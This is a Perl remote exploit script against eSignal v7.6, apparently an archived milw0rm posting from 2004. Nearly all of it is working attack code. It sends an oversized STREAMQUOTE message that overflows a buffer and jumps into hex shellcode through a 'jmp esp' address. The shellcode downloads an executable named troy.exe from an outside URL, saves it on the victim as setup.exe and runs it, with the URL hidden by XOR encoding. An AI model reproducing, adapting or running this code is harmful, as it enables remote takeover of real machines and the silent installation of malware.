#!/usr/bin/perl
#
# eSignal v7.6 remote exploit (c) VizibleSoft =*= http://viziblesoft.com/insect
#
# 25-mAR-2004
#

use IO::Socket;

sub usage 
{
   die("\nUsage: perl $0 host port\n");
}

print "\r\neSignal v7.6 remote exploit, (c) VizibleSoft.com\r\n";

my $ip      = $ARGV[0] || usage();
my $port    = $ARGV[1] || usage();
my $data    = "";
my $ret     = "\xf3\x7b\x20\x7c";	# MFC71.dll "jmp esp"
my $nop     = "\x90";

#
# Used api..
#

$api  = "\x00wininet.dll\x00InternetOpenA\x00".
	"InternetOpenUrlA\x00InternetReadFile\x00kernel32.dll\x00".
	"_lcreat\x00_lwrite\x00_lclose\x00";

#
# Url of file to execute
#

$url = "http://viziblesoft.com/insect/sploits/troy.exe";

#
#
# Filename for our file on remote system

$fname = "setup.exe";

#
#
# Shellcode: downloads and executes file at URL
#

$shellc = "\x90".
"\x8B\xEC\x03\xEA\xB8\xEA\xFE\xFF\xFF\xF7\xD0\x03\xE8\x83\xC5\x0B\x8B\xFD\x4F\xF7".
"\x17\x83\xC7\x04\x83\x3F\xFF\x7C\xF6\xF7\x17\xB8\x5C\x12\x14\x7C\x8B\x18\x55\xFF".
"\xD3\x8B\xF8\x33\xC9\xB1\x03\x8D\x55\x0C\xB8\x58\x12\x14\x7C\x8B\x18\x51\x52\x52".
"\x57\xFF\xD3\x5A\x59\x89\x02\x83\xC2\x03\x42\x8A\x02\x3A\xC5\x7F\xF9\x42\xFE\xC9".
"\x3A\xCD\x7F\xDE\xB8\x5C\x12\x14\x7C\x8B\x18\x8D\x55\x3C\x52\xFF\xD3\x8B\xF8\xB8".
"\x58\x12\x14\x7C\x8B\x18\x53\x8D\x55\x49\x52\x52\x57\xFF\xD3\x5A\x89\x02\x8B\x1C".
"\x24\x8D\x55\x51\x52\x52\x57\xFF\xD3\x5A\x89\x02\x5B\x8D\x55\x59\x52\x52\x57\xFF".
"\xD3\x5A\x89\x02\x33\xD2\x52\x52\x52\x52\x55\xFF\x55\x0C\x33\xD2\x52\xB6\x80\xC1".
"\xE2\x10\x52\x33\xD2\x52\x52\x8D\x4D\x60\x41\x51\x50\xFF\x55\x1A\x89\x45\x1A\x33".
"\xD2\x52\x8D\x55\xF6\x52\xFF\x55\x49\x89\x45\x49\x33\xD2\xB6\x02\x2B\xE2\x83\xEC".
"\x04\x33\xD2\xB6\x02\x54\x8B\xC4\x83\xC0\x08\x52\x50\x8B\x45\x1A\x50\xFF\x55\x2B".
"\x8B\x04\x24\x8D\x54\x24\x04\x50\x52\x8B\x45\x49\x50\xFF\x55\x51\x83\x3C\x24\x01".
"\x7D\xD7\x8B\x45\x49\x50\xFF\x55\x59\x8D\x55\xF6\x52\xB8\x3F\x0E\x81\xF8\x35\x80".
"\x80\x80\x80\xFF\xD0\xB8\xD3\xFC\x80\xF8\x35\x80\x80\x80\x80\xFF\xE0$fname";

$movsb = "\x90\x33\xc9\xb5\x02\xb1\xcc\x8b\xf4\x2b\xf1\x8b\xfc\x33\xd2\xb2\x15\x03\xfa\xf3\xa4";

#
# xor data block
#

$url = $api . $url;
for(my $i=0; $i<length($url); $i++) {
		$data = $data . (substr($url, $i, 1) ^ "\xff"); 
	};

$data .= "\xff\xff\xfe\xfe\xff\xff\xff\xff";

#
# construct overflow string...
#

$shellc .= $data;
$shellc .= ("\xcc" x (712 - length($shellc)));

$shellcode = $nop x (8 * 16) .
	     $shellc .
	     $ret .
	     $movsb .
	     $nop x (191-16);


# print "shellcode len: " . length($shellcode) . "\r\n";

$data = '<STREAMQUOTE>' . $shellcode . 	'</STREAMQUOTE>';

# print "sending data of len: " . length($data) . "\n";

print sendraw($data);

print "[+] Overflow sent / file executed!\n";
exit;

sub sendraw {
        my ($pstr)=@_;
        my $target;
        $target= inet_aton($ip) || die("[-] inet_aton problems");
        socket(S,2,1,getprotobyname('tcp')||0) || die("[-] Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                select(S);              $|=1;
                print $pstr;            my @in=<S>;
                select(STDOUT);         close(S);
                return @in;
        } else { die("[-] Can't connect...\n"); }}

# milw0rm.com [2004-03-26]
